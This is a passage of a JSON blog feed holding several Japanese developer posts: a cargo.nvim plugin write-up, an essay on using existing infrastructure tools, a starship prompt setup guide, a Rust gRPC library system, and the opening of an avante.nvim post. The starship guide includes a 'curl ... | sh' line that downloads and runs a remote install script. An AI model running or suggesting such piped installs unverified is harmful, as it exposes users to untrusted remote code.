APIの利用が可能となっています。この組み合わせにより、システムレベルの処理とユーザーインターフェースの実装を、それぞれの言語の強みを最大限に活かして実現できています。また、この構造によってパフォーマンスの最適化も容易になりました。Rustでの処理が必要な重い処理と、Luaで十分な軽い処理を適切に分離することで、全体的な実行効率を高いレベルで維持できています。加えて、今後の機能追加や修正においても、各層の独立性が高いため、変更の影響範囲を最小限に抑えることができます。開発を通じて得られた知見プラグインの開発を進める中で、いくつかの重要な気づきがありました。開発当初から意識していたのは責任分担です。RustとLuaの役割を明確に分けることで、開発の効率が大きく向上しました。Rustにはシステムレベルの処理を任せ、LuaではUI/UXの実装に専念する。この単純な原則が、結果として開発全体をスムーズにしてくれました。エラーハンドリングも大きな学びの一つでした。RustとLuaの特性を活かし、Rust側では可能な限り厳密なエラー処理を行い、Lua側ではそれらのエラーをユーザーにとって理解しやすい形で表示する。この組み合わせが、プラグインの信頼性向上に貢献しています。パフォーマンスについては、特に非同期処理の活用が効果的でした。Cargoコマンドの実行時間が長くなる場合でも、UIの応答性を維持できています。また、メモリ効率を意識した実装により、長時間の使用でもリソース消費を抑えられています。クロスプラットフォーム対応は予想以上に課題となりました。build.rsでの環境別設定や、パス処理の違いへの対応など、細かな配慮が必要でした。面倒なので自分と同じ環境のユーザーのみに対応しましたがユーザーが増えたら対応を考えます。これらの経験は、今後の開発にも活かしていきたいと考えています。Rust層の実装詳細コアストラクチャまず、プラグインの中核となるRustの実装を見ていきます。#[derive(Clone)]struct CargoCommands {    runtime: Arc<Runtime>,}impl CargoCommands {    fn new() -> LuaResult<Self> {        Ok(Self {            runtime: Arc::new(                tokio::runtime::Builder::new_current_thread()                    .enable_all()                    .build()                    .map_err(|e| LuaError::RuntimeError(e.to_string()))?,            ),        })    }}このコードの重要なポイントは：Cloneトレイトの実装によるランタイムの共有Arcによる安全な参照カウントTokioランタイムの効率的な管理非同期コマンド実行cargo.nvimの核となる機能、Cargoコマンドの実行処理です。impl CargoCommands {    async fn execute_cargo_command(&self, command: &str, args: &[&str]) -> LuaResult<String> {        let mut cmd = Command::new(\\"cargo\\");        cmd.arg(command);        cmd.args(args);                let output = cmd.output().map_err(|e| {            LuaError::RuntimeError(format!(\\"Failed to execute cargo {}: {}\\", command, e))        })?;                if !output.status.success() {            let error = String::from_utf8_lossy(&output.stderr);            return Err(LuaError::RuntimeError(format!(                \\"cargo {} failed: {}\\",                command, error            )));        }                Ok(String::from_utf8_lossy(&output.stdout).into_owned())    }}実装のポイント：- エラーの詳細な伝播- 出力のUTF-8変換処理- ステータスコードによる成功/失敗の判定Lua層の実装詳細ウィンドウ管理Neovimのウィンドウ管理を実装する部分です。local function create_float_win(opts)    -- ウィンドウサイズの計算    local width = math.floor(vim.o.columns * opts.window_width)    local height = math.floor(vim.o.lines * opts.window_height)        -- バッファの作成と設定    local bufnr = vim.api.nvim_create_buf(false, true)    vim.api.nvim_buf_set_option(bufnr, \\"buftype\\", \\"nofile\\")    vim.api.nvim_buf_set_option(bufnr, \\"swapfile\\", false)    vim.api.nvim_buf_set_option(bufnr, \\"modifiable\\", true)    vim.api.nvim_buf_set_option(bufnr, \\"filetype\\", \\"cargo-output\\")        -- ウィンドウ設定    local win_opts = {        relative = \\"editor\\",        width = width,        height = height,        col = math.floor((vim.o.columns - width) / 2),        row = math.floor((vim.o.lines - height) / 2),        style = \\"minimal\\",        border = opts.border    }        local winnr = vim.api.nvim_open_win(bufnr, true, win_opts)    return bufnr, winnrend実装のポイント：- 画面サイズに応じた動的なレイアウト- バッファとウィンドウの適切な設定- ユーザーカスタマイズ可能なオプション出力処理コマンド出力の整形と表示を担当する部分です。local function process_output(lines)    local processed = {}    for _, line in ipairs(lines) do        local timestamp = os.date(\\"%H:%M:%S\\")        local prefixed_line = string.format(\\"[%s] \\", timestamp)                if line:match(\\"^error\\") then            table.insert(processed, prefixed_line .. \\"@error@\\" .. line)        elseif line:match(\\"^warning\\") then            table.insert(processed, prefixed_line .. \\"@warning@\\" .. line)        elseif line:match(\\"^%s*Compiling\\") then            table.insert(processed, prefixed_line .. \\"@info@\\" .. line)        elseif line:match(\\"^%s*Running\\") then            table.insert(processed, prefixed_line .. \\"@info@\\" .. line)        elseif line:match(\\"^%s*Finished\\") then            table.insert(processed, prefixed_line .. \\"@success@\\" .. line)        else            table.insert(processed, prefixed_line .. line)        end    end    return processedend実装のポイント：- タイムスタンプによる実行時間の可視化- 出力種別に応じた装飾- 効率的な文字列処理プラグインの初期化と設定動的ライブラリのロードプラグインの初期化時に重要な、動的ライブラリのロード処理です。local function load_cargo_lib()    local plugin_dir = vim.fn.fnamemodify(vim.fn.resolve(debug.getinfo(1, \\"S\\").source:sub(2)), \\":h:h:h\\")    local lib_name = vim.fn.has(\\"mac\\") == 1 and \\"libcargo_nvim.dylib\\"        or vim.fn.has(\\"win32\\") == 1 and \\"cargo_nvim.dll\\"        or \\"libcargo_nvim.so\\"    local lib_path = plugin_dir .. \\"/target/release/\\" .. lib_name        if vim.fn.filereadable(lib_path) == 0 then        error(string.format(\\"Cargo library not found: %s\\", lib_path))    end        return package.loadlib(lib_path, \\"luaopen_cargo_nvim\\")()end実装のポイント：- クロスプラットフォーム対応- 適切なエラーハンドリング- ライブラリパスの動的解決パフォーマンス最適化のポイントRust側の最適化メモリ効率Arcによる共有リソースの効率的な管理適切なライフタイム管理不必要なクローンの回避非同期処理Tokioランタイムの効率的な利用ブロッキング処理の最小化適切なエラーハンドリングLua側の最適化バッファ管理必要最小限のバッファ更新効率的な行挿入メモリ使用量の最適化ウィンドウ管理リソースの適切な解放イベントの効率的な処理画面更新の最適化おわりに「なんとなく」Rustを選んで始めたcargo.nvimの開発でしたが、結果として多くの学びがありました。特に印象的だったのは、RustとLuaという異なる言語の組み合わせが予想以上に効果的だったことです。当初は「かっこいいから」という理由で選んだRustですが、システムレベルの処理とエラーハンドリングの面で、その選択は正しかったと確信しています。設計面では、「なんとなく」とは正反対の、明確な責任分担の重要性を学びました。RustとLuaの境界をしっかりと定義し、各言語の得意分野を活かすことで、保守性の高い構造を実現できました。また、非同期処理やメモリ効率の最適化など、パフォーマンスに関する知見も得られました。思えば、「なんとなく」から始まったこのプロジェクトは、むしろ「必然」だったのかもしれません。時としてエンジニアの直感は、技術的な正当性を伴って現実のものとなるのだと、身をもって体験しました。今後も、この「なんとなく」と「確信」が混ざり合った独特な開発体験を大切にしながら、より使いやすく、高性能なプラグインを目指して開発を続けていきたいと思います。最後まで読んでいただき、ありがとうございました。自作したツールcargo.nvimについて、This Week in RustにPRを送信したところ、マージされ、\\"Great project, thanks for the submission!\\"というコメントをいただきました。https://t.co/RB1ExrAhwJ pic.twitter.com/zcUpS6eX2G— nwiizo (@nwiizo) 2025年1月16日   参考リンクcargo.nvim関連cargo.nvim GitHub リポジトリcargo.nvim ドキュメントNeovim開発関連Neovim API ドキュメントNeovim Lua ガイドNeovim プラグイン開発ガイドRust開発関連mlua クレートのドキュメントtokio ドキュメントCargo Bookその他の参考資料Lua 5.4 リファレンスマニュアルRust非同期プログラミングガイド","isoDate":"2025-01-15T02:08:31.000Z","dateMiliSeconds":1736906911000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイクのエンジニアが翻訳を担当した『Kubernetesで実践する Platform Engineering』が2月19日に発売","link":"https://sreake.com/blog/platform-engineering-in-practice-with-kubernetes/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、当社エンジニア4名が翻訳を担当した『Kubernetesで実践する Platform Engineering』が翔泳社より2025年2月19日に発売されることをお知らせします。The post スリーシェイクのエンジニアが翻訳を担当した『Kubernetesで実践する Platform Engineering』が2月19日に発売 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-01-14T01:00:00.000Z","dateMiliSeconds":1736816400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"既にあるものを正しく使うあるいは、インフラストラクチャをつくるとはどういうことなのか","link":"https://syu-m-5151.hatenablog.com/entry/2025/01/12/202120","contentSnippet":"「既存のツールはどれも使えない。自分たちで作るしかない」はじめにインフラ/プラットフォームチームでよく耳にする言葉です。監視システム、デプロイメントパイプライン、構成管理ツール。エンジニアたちは次々と内製化の道を選びます。しかし、本当にゼロからの開発は必要なのでしょうか。このような判断の裏には、私たちが見落としがちな重要な視点が隠れています。多くのチームが「自前開発」という選択肢に飛びつく前に、立ち止まって考えるべきことがあります。システム運用アンチパターン ―エンジニアがDevOpsで解決する組織・自動化・コミュニケーション作者:Jeffery D. SmithオライリージャパンAmazonインフラストラクチャを「作る」とは何かインフラストラクチャを「作る」行為は必ずしもコードを書くことを意味しません。それは組織のニーズに合わせて適切なツールを選び運用プロセスを設計することです。経験豊富なエンジニアは問題解決の方法を知っています。正しい道具を選び効果的に使う経験を持っているのです。ja.wikipedia.org優れたエンジニアは必ずしも多くのコードを書きません。彼らは既存のツールを深く理解し効果的に組み合わせることで大きな価値を生み出します。toris.ioなぜ私たちは独自開発を選びがちなのか多くのインフラエンジニアは既存ツールよりも独自開発を選びます。その背景にはいくつかの思い込みがあります。最も多いのは「自社の環境は特殊だ」という思い込みです。確かにどの組織にも固有の課題はあります。しかしそれは既存ツールの組み合わせで解決できることが多いのです。次に「既存ツールの学習コストが高すぎる」という過大評価があります。新しいツールを作るコストと比べて本当にそうでしょうか。長期的な運用コストまで考える必要があります。また「技術的チャレンジへの期待」から独自開発を選ぶこともあります。新しい技術を学ぶことは重要です。しかし既存ツールの深い理解と活用にも同様の技術的チャレンジは存在します。正しいものを正しくつくる　プロダクトをつくるとはどういうことなのか、あるいはアジャイルのその先について作者:市谷 聡啓ビー・エヌ・エヌ新社Amazon組織とツールの調和ツール選定で最も重要なのは組織の成熟度とチームの体制に合わせた選択です。これは単なる技術的な判断ではありません。チームの技術力と学習能力は現状と将来の両面から判断が必要です。既存ツールの採用はチームの学習機会にもなります。組織の運用プロセスと文化もツール選択に大きく影響します。例えばGitOpsツールの導入ではチームの作業フローやレビュープロセスも再設計する必要があります。ツールの導入は組織全体の変革につながるのです。「変化を嫌う人」を動かす:魅力的な提案が受け入れられない4つの理由作者:ロレン・ノードグレン,デイヴィッド・ションタル,船木 謙一(監修)草思社AmazonOSSとの関わり方新しいツールを作る代わりに既存のOSSプロジェクトへの貢献を選択する価値は大きいです。これは「作る」から「改善に貢献する」への文化的シフトを意味します。OSSプロジェクトへの貢献は単なるコード提供以上の意味があります。コミュニティとの関わりを通じてチームの視野は広がります。技術力も向上します。3-shake.connpass.comzenn.devインフラストラクチャの価値を最大化するインフラエンジニアとしての価値ある選択は時として「作らない」という判断です。既存のツールやサービスを組織に合わせて活用し真に価値のある部分に時間を投資すべきです。新しいものを作ることは選択肢の一つに過ぎません。より重要なのは組織の目標達成に最も効果的な手段を選ぶことです。そのためには既存ツールの深い理解が必要です。組織のニーズを正確に把握することも欠かせません。 speakerdeck.comまとめインフラストラクチャを「作る」とは新しいツールを開発することだけを意味しません。それは既存の優れたツールを理解し組織に最適な形で導入することです。組織にとって重要なのは、「新しいものを作る」よりも既存のものを効果的に活用し改善に貢献できる文化を育てることです。これにより、インフラストラクチャの真の価値を最大化することができます。同時に、エンジニアにとって新しい技術への挑戦や実装は大きな魅力であり、そこから得られる学びや成長は貴重な財産となります。組織の正解と個人の楽しさは別物ですが、どちらも尊重しなければならないのでバランス感覚は必要です。楽しくなければエンジニアなんて退職してしまいます。優れたエンジニアは、この組織のニーズと個人の技術的探求のバランスを取りながら、キャリアを進めていっている気がします。","isoDate":"2025-01-12T11:21:20.000Z","dateMiliSeconds":1736680880000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"interface、structで書くか、functionで書くか","link":"https://zenn.dev/kamos/articles/e044ae9cbb9f4c","contentSnippet":"始めにこの正月に、関数型ドメインモデリングという本を読みました。良書でした。https://amzn.asia/d/4NlwXFgそこで、今までオブジェクトで書いていたコードを関数としてかけないか?という思いつきでこの記事を書いた結果、なんだか関数型とは関係ない感じの記事になってしまいました。ご容赦ください。 ベースとなるサンプルコードまずはオブジェクト指向でよく使う形のサンプルを用意しました。タスク管理のモデルです。簡単のため、エラーなどはあまり返さないようにしています。domain/user.gopackage domainimport \\"fmt\\"typ...","isoDate":"2025-01-12T08:31:09.000Z","dateMiliSeconds":1736670669000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"年始にstarshipでプロンプトの式年遷宮を行いたい","link":"https://syu-m-5151.hatenablog.com/entry/2025/01/10/185633","contentSnippet":"適応は適応力を阻害する知識創造企業（新装版）作者:野中 郁次郎,竹内 弘高東洋経済新報社Amazonはじめに開発環境の最適化は、現代のソフトウェア開発において重要な課題です。また、その更新には式年遷宮のように、定期的な刷新には技術の継承と革新という二つの側面があります。しかし、過度な適応は適応力を阻害するという逆説もあります。この視点から、私は開発環境を定期的に見直し、必要な変更を加えています。昨年、その一環としてターミナルエミュレータをWarpに移行しました。Warpは洗練されたUIと優れた機能性を備え、AIによるコマンド提案やブロックベースの出力表示など、モダンな機能により開発効率を大きく向上させてくれました。agnozingdays.hatenablog.com招待があるのでこちらからインストールしてください❤️https://app.warp.dev/referral/9Z8MRV2025年を迎え、新たな改善として開発環境のさらなる最適化を目指しています。特に注目したのが、日々の開発作業で最も頻繁に目にするターミナルのプロンプトです。より詳細な開発環境の状態把握を実現するため、高速でカスタマイズ性の高いクロスシェルプロンプト「starship」の導入を決めました。この記事では、Fishシェルをベースにしたstarshipの導入過程と、具体的な設定内容を共有します。また、WarpとFish、そしてstarshipの組み合わせがもたらす相乗効果についても詳しく解説していきます。starship.rsstarshipの特徴と選択理由starshipは、任意のシェルで動作する、高速で柔軟なプロンプトです。Rustで書かれており、システムリソースを最小限に抑えながら、豊富な情報を表示できることが特徴です。私がstarshipを選択した主な理由は以下の点です。まず、クロスシェル対応という特徴が魅力的でした。開発環境によってbash、zsh、fishなど異なるシェルを使用することがありますが、starshipならば一つの設定ファイルですべてのシェルで同じ見た目と機能を実現できます。次に、Rustで実装されているという点も重要でした。シェルの起動時やプロンプトの更新時のパフォーマンスが優れており、ストレスなく使用できます。特に大規模なGitリポジトリでの作業時でも、プロンプトの更新による遅延をほとんど感じません。また、モジュール式の設計により、必要な情報だけを選択して表示できる点も気に入っています。開発言語やツールの追加・削除が容易で、環境の変化に合わせて柔軟に対応できます。starship.rsインストールと初期設定私は普段からFishシェルを使用しているため、まずFishのインストール状況を確認しました。macOSではHomebrewを使ってFishをインストールしています。brew install fish続いて、starshipもHomebrewでインストールしました：brew install starshipなお、他のOS環境では公式のインストールスクリプトを使用することもできます。curl -sS https://starship.rs/install.sh | shFishシェルの場合、~/.config/fish/config.fishの末尾に以下の初期化コードを追加します。starship init fish | sourceこの設定により、Fishシェルの起動時に自動的にstarshipが初期化されます。私の場合、既にFishの設定ファイルにはテーマやエイリアスなどの設定が含まれていましたが、starshipはそれらと競合することなく動作しています。特に、Fishの持つ構文ハイライトや補完機能との相性が良く、快適な開発環境を実現できています。プロンプトの詳細設定starship.rsstarshipの設定は~/.config/starship.tomlで行います。私の設定では、開発で使用する様々なツールの状態を視覚的に把握できるように工夫しています。github.comそれ以外にも設定のサンプルがあるの使ってみたり、参考にしてもよいかもです。starship.rsプロンプトのレイアウト設定formatセクションでは、プロンプトの全体的な構造を定義しています。パワーライン風のデザインを採用し、各モジュール間を矢印で滑らかに接続しています。format = \\"\\"\\"[](fg:#9A348E)\\\\$directory\\\\[](fg:#DA627D bg:#9A348E)\\\\$git_branch\\\\$git_status\\\\[](fg:#FCA17D bg:#DA627D)\\\\$kubernetes\\\\[](fg:#86BBD8 bg:#FCA17D)\\\\$aws\\\\...このように、各セグメントの背景色を前後で調整することで、矢印型のつなぎ目を実現しています。色は、視認性とアクセシビリティを考慮して選択しました。ディレクトリ表示の最適化カレントディレクトリの表示は、開発作業において最も基本的な情報です。[directory]style = \\"fg:#E4E4E4 bg:#9A348E\\"format = \'[ $path ]($style)\'truncation_length = 3truncation_symbol = \\"…/\\"truncation_length = 3の設定により、ディレクトリの深さが3階層を超える場合は自動的に省略されます。これにより、長いパスでもプロンプトが横に広がりすぎることを防いでいます。また、truncation_symbol = \\"…/\\"で省略部分を直感的に表現しています。Git情報の詳細表示Git関連の情報は、開発作業において特に重要です。[git_branch]symbol = \\" \\"style = \\"fg:#E4E4E4 bg:#DA627D\\"format = \'[ $symbol$branch ]($style)\'[git_status]style = \\"fg:#E4E4E4 bg:#DA627D\\"format = \'[$all_status$ahead_behind ]($style)\'conflicted = \\"≠\\"ahead = \\"⇡${count}\\"behind = \\"⇣${count}\\"diverged = \\"⇕\\"untracked = \\"\xb1${count}\\"stashed = \\"※\\"modified = \\"!${count}\\"staged = \\"+${count}\\"renamed = \\"\xbb${count}\\"deleted = \\"\xd7${count}\\"Gitの状態を直感的なアイコンで表現することで、リポジトリの状態を一目で把握できます。特に以下の状態を重視しています。コンフリクトの発生（≠）プッシュ・プル待ちの変更（⇡/⇣）作業ディレクトリの状態（未追跡、変更、ステージング）スタッシュの存在（※）これらの情報をコンパクトに表示することで、Git操作のミスを防ぎ、効率的な作業を実現しています。クラウドと開発環境の状態表示現代の開発では、複数のクラウドサービスやコンテナ環境を使用することが一般的です。[kubernetes]symbol = \\"☸ \\"style = \\"fg:#E4E4E4 bg:#FCA17D\\"format = \'[ $symbol$context(\\\\($namespace\\\\)) ]($style)\'disabled = false[aws]symbol = \\"☁ \\"style = \\"fg:#E4E4E4 bg:#86BBD8\\"format = \'[ $symbol($profile)(\\\\($region\\\\)) ]($style)\'disabled = false[docker_context]symbol = \\"\uD83D\uDC0B \\"style = \\"fg:#E4E4E4 bg:#33658A\\"format = \'[ $symbol$context ]($style)\'これらの設定により、以下の情報を常に把握できます。KubernetesのコンテキストとネームスペースAWSとGoogle Cloud プロファイルとリージョンDockerのコンテキスト特にマルチクラウド環境での作業時に、誤った環境で操作してしまうリスクを軽減できます。プログラミング言語とツールのバージョン表示各プログラミング言語やツールのバージョン情報も、プロジェクトごとに適切に表示されます。[golang]symbol = \\"\uD83D\uDC39 \\"style = \\"fg:#E4E4E4 bg:#06969A\\"format = \'[ $symbol($version) ]($style)\'[python]symbol = \\"\uD83D\uDC0D \\"style = \\"fg:#E4E4E4 bg:#1B9F62\\"format = \'[ $symbol($version) ]($style)\'detect_extensions = [\\"py\\"]python_binary = [\\"python\\", \\"python3\\"][nodejs]symbol = \\"⬢ \\"style = \\"fg:#E4E4E4 bg:#33658A\\"format = \'[ $symbol($version) ]($style)\'detect_extensions = [\\"js\\", \\"ts\\", \\"tsx\\"]detect_files = [\\"package.json\\", \\"tsconfig.json\\"][rust]symbol = \\"⚙ \\"style = \\"fg:#E4E4E4 bg:#86BBD8\\"format = \'[ $symbol($version) ]($style)\'detect_extensions = [\\"rs\\"]detect_files = [\\"Cargo.toml\\", \\"Cargo.lock\\"]各言語の設定では、以下の点に注意を払っています。適切なファイル検出設定(認知が追いつかない部分を勝手に取得できるように)わかりやすいアイコンの選択(環境を間違って死なないように)バージョン情報の明確な表示(バージョンの勘違いで泣かないように)また、Terraform、Google Cloudなどのインフラ関連ツールも同様に設定しています。[terraform]symbol = \\"\uD83C\uDFD7 \\"style = \\"fg:#E4E4E4 bg:#06969A\\"format = \'[ $symbol$workspace ]($style)\'[gcloud]symbol = \\"\uD83C\uDF10 \\"style = \\"fg:#E4E4E4 bg:#33658A\\"format = \'[ $symbol$account(@$domain)(\\\\($project\\\\)) ]($style)\'時刻表示とプロンプト文字作業時間の管理や、コマンド実行時刻の記録のために、時刻表示も含めています。[time]disabled = falsetime_format = \\"%R\\"style = \\"fg:#E4E4E4 bg:#86BBD8\\"format = \'[ $time ]($style)\'[character]success_symbol = \\"❯\\"error_symbol = \\"❯\\"vimcmd_symbol = \\"❮\\"24時間形式で時刻を表示し、コマンドの実行状態に応じてプロンプト文字を変更します。特にvimモードを使用している場合は、モードの切り替えが一目でわかるようになっています。おわりにstarshipを導入して一週間が経過しましたが、starshipの導入により、開発環境の視認性と操作性が大きく向上しました。新年を迎えるにあたっての環境整備として、非常に満足のいく選択だったと感じています。この設定は、私の開発スタイルに合わせて最適化したものですが、starshipの柔軟な設定システムを活用することで、誰でも自分に最適な開発環境を構築できます。ぜひ皆さんも、自分の作業スタイルに合わせたカスタマイズを試してみてください。設定ファイルは公開していますので、参考にしていただければ幸いです。また、今後も開発環境の改善を続け、さらに効率的な開発環境を目指していきたいと思います。","isoDate":"2025-01-10T09:56:33.000Z","dateMiliSeconds":1736502993000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"RustでのProtocol Buffersを学習するための図書管理システム実装","link":"https://syu-m-5151.hatenablog.com/entry/2025/01/10/133852","contentSnippet":"はじめにProtocol BuffersとRustの実践的な学習を目的として図書管理システムを開発しました。 システムの構築にあたってはBufによるスキーマ管理とコード生成を採用することで開発環境を実現しています。今回の実装を通じてRustにおけるgRPCサービスの構築手法について理解を深めることができました。buf.buildフロントエンド開発については今後の課題として検討しています。 Remixが気になっているので実装したいと思ってます。本記事ではバックエンド実装に焦点を当てて解説します。 特にRustのエコシステムにおけるtonicやSQLxといったライブラリの活用方法に着目します。これらの実装を通じて得られた知見は他のRustプロジェクトにも応用可能な内容となっています。学習目的で実装したコードなので何かに活用していただければ幸いです。github.comプロジェクトのセットアップまず、以下のようなディレクトリ構造を作成します：library-system/├── buf/│   ├── buf.yaml│   ├── buf.gen.yaml│   └── library/│       └── v1/│           └── library.proto├── library-server/└── library-client/Bufの設定buf.yaml:version: v1name: buf.build/yourusername/library-systembreaking:  use:    - FILElint:  use:    - DEFAULTbuf.gen.yaml:version: v1plugins:  - plugin: buf.build/protocolbuffers/rust    out: ../library-server/src    opt:      - bytes=bytes  - plugin: buf.build/community/neoeinstein-tonic-rust    out: ../library-server/src    opt:      - no_client=false      - no_server=falseAPIの設計Protocol Buffersを使用してAPIを定義します：syntax = \\"proto3\\";package library.v1;import \\"google/protobuf/timestamp.proto\\";service LibraryService {    rpc CreateUser(CreateUserRequest) returns (CreateUserResponse);    rpc GetUser(GetUserRequest) returns (GetUserResponse);    rpc SearchBooks(SearchBooksRequest) returns (SearchBooksResponse);    rpc CreateLoan(CreateLoanRequest) returns (CreateLoanResponse);    rpc ReturnBook(ReturnBookRequest) returns (ReturnBookResponse);}図書管理システムの実装詳細アーキテクチャと技術選定システムの基盤には非同期処理による高パフォーマンスな実装を採用しました。 Rustの非同期ランタイムであるtokioを活用することでリソースの効率的な利用を実現します。サーバーの起動処理は以下のコードで示すように非同期処理を基本とした設計です。#[tokio::main]async fn main() -> Result<(), Box<dyn std::error::Error>> {    let service = LibraryServiceImpl::new(&database_url).await?;    Server::builder()        .add_service(LibraryServiceServer::new(service))        .serve(addr)        .await?;    Ok(())}サーバーサイドの主要実装Protocol Buffersによるサービス定義が実装の起点となります。 サーバーの中核機能はLibraryServiceImpl構造体に集約されます。SQLxを用いたデータベース操作により型安全性の高いコードを実現しました。貸出処理のトランザクション制御は特に慎重な実装を必要としました。 以下のコードでは書籍の貸出状態確認から更新までを単一トランザクションで処理します。async fn create_loan(&self, request: Request<CreateLoanRequest>) -> Result<Response<CreateLoanResponse>, Status> {    let mut tx = self.pool.begin().await?;    let book = sqlx::query_scalar::<_, bool>(\\"SELECT available FROM books WHERE id = ?\\")        .bind(&req.book_id)        .fetch_optional(&mut *tx)        .await?;    if !book.available {        return Err(Status::failed_precondition(\\"Book is not available\\"));    }    // 貸出処理の実行    tx.commit().await?;    Ok(Response::new(loan_response))}クライアントサイドの実装ユーザーインターフェースは直感的な操作を重視しました。 クライアントの初期化処理は以下のように簡潔な実装としています。async fn main() -> Result<(), Box<dyn std::error::Error>> {    let channel = Channel::from_static(\\"http://[::1]:50051\\").connect().await?;    let client = LibraryServiceClient::new(channel);}エラー処理は利用者の視点を重視した実装としました。 サーバーからのエラーレスポンスを適切にハンドリングすることでユーザーへの明確なフィードバックを実現します。データベース設計データモデルは業務要件を正確に反映する設計としました。 ユーザー情報と書籍情報を管理する基本テーブルに加えて貸出履歴を記録するテーブルを実装します。CREATE TABLE loans (    id TEXT PRIMARY KEY,    book_id TEXT NOT NULL REFERENCES books(id),    user_id TEXT NOT NULL REFERENCES users(id),    loan_date TIMESTAMP NOT NULL,    due_date TIMESTAMP NOT NULL,    return_date TIMESTAMP);スキーマ設計は将来の拡張性を考慮しました。 返却日時や貸出状態を管理するカラムを追加することで機能拡張への対応を可能としています。この実装を通じて学んだ最も重要な点は型安全性とトランザクション管理の重要性です。RustとSQLxの組み合わせにより堅牢なシステムを実現できました。主要な機能ユーザー管理ユーザーの作成ユーザー情報の取得書籍管理書籍の検索在庫状態の管理貸出管理書籍の貸出返却処理貸出状態の追跡参考リソースBuf DocumentationTonic DocumentationSQLx DocumentationProtocol Buffers DocumentationGenerated SDKs for Rust now available on the Buf Schema Registryまとめ今回は図書管理システムを題材にRustとProtocol Buffersを組み合わせた実装を検証しました。 tonicとSQLxを活用したバックエンド開発を通じて両者の親和性の高さを実感できました。Rustの型システムと所有権の概念がProtocol Buffersの型定義と自然に調和する点が特に印象的でした。エラー処理と非同期プログラミングの実装パターンについても有意義な知見を得られました。 RustのResult型とtonicのステータスコードの組み合わせは明快なエラーハンドリングを実現します。またtokioを基盤とした非同期処理はSQLxのトランザクション管理と組み合わせることで堅牢な実装を可能にします。今後は本実装をベースにさらなる検証を進めたいと考えています。 予約システムやユーザー認証の追加を通じてスケーラブルな設計の可能性を探ります。フロントエンド開発ではRemixとTypeScriptを採用することでエンドツーエンドの型安全性についても検証を行う予定です。またDockerコンテナ化やCI/CDパイプラインの整備を通じて本番環境での運用性も確認していきます。RustとProtocol Buffersを主軸とした本プロジェクトは実用的なシステム開発の基盤として十分な手応えを感じる結果となりました。今回得られた知見は今後の開発プロジェクトにも大いに活用できるものと確信しています。最後に初春の誓い 新たに刻みしも昨日の影が まだ私を離さず目標という星は 遠く輝けど手の届かぬ空に ただ揺れている日々は川の流れのように変わらぬ場所を 静かに過ぎゆくされど生は進み刻は確かに 私を育てる明日もまた 新しい朝が来るそれだけが 確かな真実2024年もみなさん、最後まで読んでくれて本当にありがとうございます。途中で挫折せずに付き合ってくれたことに感謝しています。読者になってくれたら更に感謝です。XやGithubまでフォロワーしてくれたら泣いているかもしれません。","isoDate":"2025-01-10T04:38:52.000Z","dateMiliSeconds":1736483932000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"NeovimをCursorのように進化させる - yetone/avante.nvim の導入","link":"https://syu-m-5151.hatenablog.com/entry/2025/01/07/220406","contentSnippet":"「もはやCopilotなしでは開発できない」Cursorが体験として革新的すぎる」Clineこそ俺達が求めていたものだ！」とにかく新世代のAIエディターが最高！」  はじめに開発者のタイムラインを開けば、そんな投稿で溢れかえっています。確かに、AIによる開発支援は革新的で、プログラミングの未来を感じさせるものです。特に最近では、単なるコード補完を超えて、より多機能なAIアシスタントとしての役割を担うツールが増えてきています。実は、愛用のNeovimでもこうした最新のAI機能を導入できるんです。しかも、使い慣れたキーバインドやプラグインはそのまま。今回はavante.nvimというプラグインを使って、NeovimをAIパワード開発環境へと進化させる方法をご紹介します。github.comこのプラグインは、私たちvimmerにとって既に身近な存在であるcopilot.luaのような補完機能を超えて、より包括的なAI支援を実現します。コードの理解、リファクタリング、そして対話的なアシスタント機能まで、新世代のAIエディターが持つ機能をNeovimで実現できるのです。これまでのvimmerは、copilot.luaのようなシンプルで効率的なコード補完ツールを活用してきました。しかし、新世代のAIエディターは、コードの解析、リファクタリングの提案、そしてより高度なコンテキスト理解を備えています。この進化に対して、私たちvimmerはどのように向き合うべきでしょうか？でも、待ってください。私たち Vimmer はどうすれば...？ 長年磨き上げてきたNeovimを捨てて、新しいエディターに移行しなければいけないのでしょうか？いいえ、Neovimはもっと強くなれます。Neovimの最大の魅力は、その圧倒的なカスタマイズ性。それは単なるIDE（統合開発環境）ではなく、PDE（Personal Development Environment：個人開発環境）とも呼べる存在です。まるで自分だけの剣を鍛え上げていくように、エディターと共に成長していける。そんな独特の魅力がNeovimにはあります。私たちは常にNeovimを進化させ、新しい可能性を追求してきました。copilot.luaがその一例です。そして今、avante.nvimによって、さらなる進化の時が来ています。Neovim 以外の話はこちらです。laiso.hatenablog.comavante.nvim とはavante.nvimは、Cursor AI IDEの機能を模倣することを目的として開発されたNeovimプラグインです。AI駆動のコード提案機能を提供し、その提案を直接ソースファイルに適用できる機能を備えています。上記のカテゴリーでいうとコーディングエージェントに近いものになります。デモ動画こういう経験がサクッと得られるのでよいです。 https://t.co/x7S08l06v9 pic.twitter.com/X4mvE2c2H7— nwiizo (@nwiizo) 2025年1月7日   subを追加する例です。 https://t.co/x7S08l06v9 pic.twitter.com/EyjDkdzP9c— nwiizo (@nwiizo) 2025年1月7日   Note: GitHub上にデモ動画がありますが、実際の動作の様子を簡単に説明させていただきます：avante.nvimを使用すると、画面右側にAIアシスタントのサイドバーが表示され、現在開いているコードについて対話形式で質問や提案を行うことができます。コードの変更提案は差分形式で表示され、ワンクリックで適用することができます。まさにCursor AI IDEのような操作感を、Neovim上で実現しています。実際の動作については、GitHubのリポジトリでも確認することができます。特徴的な機能AIによるコードアシスタント: 現在のコードファイルについてAIに質問し、インテリジェントな提案を受けることができますワンクリック適用: AIの提案をシンプルなコマンドで即座にソースコードに反映できます他の生成AIとの連携: デフォルトのClaudeに加え、ChatGPTやGitHub Copilotを活用したコード提案が可能ですセットアップ方法lazy.nvimを使用した場合の設定例を紹介します。avante.nvimはデフォルトではCursorのように高度なAI機能を利用するように設定されていますが、他にもChatGPTやAzureなども指定できますが今回はより手軽に利用できるGitHub Copilotをプロバイダーとして設定します。これにより、Copilotのライセンスさえあれば、追加のAPIキーの設定なしでAI支援機能を利用することができます。以下が具体的な設定例です。{  